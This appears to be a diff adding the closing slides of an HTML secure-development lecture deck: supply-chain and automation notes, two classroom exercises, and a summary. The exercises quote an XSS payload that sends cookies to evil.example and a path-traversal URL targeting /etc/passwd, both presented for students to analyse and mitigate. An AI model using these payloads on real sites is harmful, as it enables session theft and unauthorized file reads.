+                            <li><strong>Build Provenance:</strong> Reproducible builds; signed artifacts; isolated runners.</li>
+                        </ul>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-3">🤖 Automation: Use Cases & Considerations</h3>
+                        <ul class="space-y-2 text-gray-400 list-disc list-inside">
+                            <li><strong>Use cases:</strong> CI policy gates, IaC guardrails, least-privilege provisioning, ticketing, incident enrichment.</li>
+                            <li><strong>Benefits:</strong> Consistency, speed, scale, measurable baselines.</li>
+                            <li><strong>Considerations:</strong> Complexity/SPOF, cost, false positives, technical debt, supportability.</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- NEW Slide 21: Think–Pair–Share — Part 1 -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto text-center">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-gray-300">🤔 Think–Pair–Share — Part 1</h2>
+                <div class="bg-yellow-900/20 border border-yellow-500/30 rounded-lg p-5 text-left mb-6">
+                    <h3 class="text-xl font-semibold text-yellow-300 mb-3 text-center">Scenario: A Busy Comment Thread</h3>
+                    <p class="text-yellow-200">A popular blog allows users to post comments. One post contains user-supplied content that is rendered back into the page. An attacker posts a comment that includes the following snippet:</p>
+                    <p class="text-gray-300 bg-zinc-900 p-2 rounded-md my-2 font-mono text-sm break-all">&lt;script&gt;document.location='http://evil.example/steal?c=' + document.cookie&lt;/script&gt;</p>
+                </div>
+                <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5 text-left">
+                    <h3 class="text-xl font-semibold text-gray-300 mb-3 text-center">Your Task (5–7 minutes)</h3>
+                    <ul class="space-y-2 text-gray-400 list-decimal list-inside">
+                        <li>Identify the vulnerability class and where untrusted input is being handled.</li>
+                        <li>List two realistic impacts on end users or the application.</li>
+                        <li>Propose one <em>server-side</em> control and one <em>client-side/browser</em> control to mitigate this risk.</li>
+                        <li><span class="text-gray-500">Optional:</span> How would stronger session handling change the likelihood or impact?</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- NEW Slide 22: Think–Pair–Share — Part 2 -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto text-center">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-gray-300">🔬 Think–Pair–Share — Part 2</h2>
+                <div class="bg-yellow-900/20 border border-yellow-500/30 rounded-lg p-5 text-left mb-6">
+                    <h3 class="text-xl font-semibold text-yellow-300 mb-3 text-center">Scenario: File Viewer Endpoint</h3>
+                    <p class="text-yellow-200">A website displays images via a query parameter:</p>
+                    <p class="text-gray-300 bg-zinc-900 p-2 rounded-md my-2 font-mono text-sm break-all">https://example.com/view.php?file=profile_pic.jpg</p>
+                    <p class="text-yellow-200">An attacker crafts a link and convinces a user to click it:</p>
+                    <p class="text-gray-300 bg-zinc-900 p-2 rounded-md mt-2 font-mono text-sm break-all">https://example.com/view.php?file=../../../../etc/passwd</p>
+                </div>
+                <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5 text-left">
+                    <h3 class="text-xl font-semibold text-gray-300 mb-3 text-center">Your Task (5–7 minutes)</h3>
+                    <ol class="space-y-2 text-gray-400 list-decimal list-inside">
+                        <li>Name the vulnerability and the immediate input-handling failure.</li>
+                        <li>Explain the goal of the path segments and what data the attacker is trying to access.</li>
+                        <li>Propose two mitigations: one input validation/canonicalization approach and one filesystem/OS-level control.</li>
+                        <li><span class="text-gray-500">Optional:</span> What logs/alerts would help you detect attempts like this in production?</li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 23: Summary -->
+        <div class="slide p-6 md:p-12">
+            <div class="w-full h-full flex items-center justify-center">
+                <div class="max-w-4xl mx-auto">
+                    <h2 class="text-3xl md:text-4xl font-bold mb-8 text-center text-gray-300 border-b-2 border-gray-600 pb-4">Chapter Summary</h2>
+                    <div class="space-y-4">
+                        <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                            <h3 class="text-xl font-semibold text-purple-400 mb-2">🔒 Security is a Lifecycle Responsibility</h3>
+                            <p class="text-gray-400">Integrate security into every SDLC phase—from requirements to decommissioning.</p>
+                        </div>
+                        <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                            <h3 class="text-xl font-semibold text-purple-400 mb-2">✅ Validate, Encode, Authorize</h3>
+                            <p class="text-gray-400">Most web vulns trace to untrusted input and weak authZ. Validate/encode output and enforce least privilege.</p>
+                        </div>
+                        <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                            <h3 class="text-xl font-semibold text-purple-400 mb-2">⚙️ Automate Testing & Supply Chain Hygiene</h3>
+                            <p class="text-gray-400">SAST/DAST/Fuzzing + SCA in CI/CD catch issues early; signed updates and SBOMs reduce supply-chain risk.</p>
+                        </div>
+                        <div class="bg-red-900/50 border border-red-500/50 rounded-lg p-5">
+                            <h3 class="text-xl font-semibold text-red-300 mb-2">🚨 Bottom Line</h3>
+                            <p class="text-gray-300">Every line of code is potential attack surface. Defense-in-depth, automation, and secure-by-default design build resilience.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div> <!-- end #presentation-container -->
+
+    <!-- Navigation -->
+    <div id="navigation" class="fixed bottom-0 left-0 right-0 h-20 bg-zinc-900/80 backdrop-blur-sm border-t border-zinc-700 flex items-center justify-center px-6">
+        <div class="w-full max-w-4xl flex items-center justify-between">
+            <button id="prevBtn" class="bg-zinc-700 text-white font-bold py-2 px-4 rounded-md hover:bg-zinc-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed">Previous</button>
+            <div class="flex-grow mx-4">
+                <div class="w-full bg-zinc-700 rounded-full h-2.5">
+                    <div id="progressBar" class="bg-purple-600 h-2.5 rounded-full" style="width: 0%"></div>
+                </div>
+            </div>
+            <button id="nextBtn" class="bg-purple-700 text-white font-bold py-2 px-4 rounded-md hover:bg-purple-600 transition-colors">Next</button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const slides = document.querySelectorAll('.slide');
+            const prevBtn = document.getElementById('prevBtn');
+            const nextBtn = document.getElementById('nextBtn');
+            const progressBar = document.getElementById('progressBar');
+            let currentSlide = 0;
+            const totalSlides = slides.length;
+
+            function showSlide(index) {
+                const activeSlide = document.querySelector('.slide.active');
+                if (activeSlide) activeSlide.classList.remove('active');
+                slides[index].classList.add('active');
+                const progressPercentage = ((index + 1) / totalSlides) * 100;
+                progressBar.style.width = `${progressPercentage}%`;
+                prevBtn.disabled = index === 0;
+                nextBtn.disabled = index === totalSlides - 1;
+                nextBtn.textContent = index === totalSlides - 1 ? 'Finish' : 'Next';
+            }
+
+            nextBtn.addEventListener('click', () => {
+                if (currentSlide < totalSlides - 1) {
+                    currentSlide++;
+                    showSlide(currentSlide);
+                }
+            });
+
+            prevBtn.addEventListener('click', () => {
+                if (currentSlide > 0) {
+                    currentSlide--;
+                    showSlide(currentSlide);
+                }
+            });
+
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'ArrowRight' && !nextBtn.disabled) {
+                    nextBtn.click();
+                } else if (e.key === 'ArrowLeft' && !prevBtn.disabled) {
+                    prevBtn.click();
+                }
+            });
+
+            showSlide(currentSlide);
+        });
+    </script>
+</body>
+</html>
+
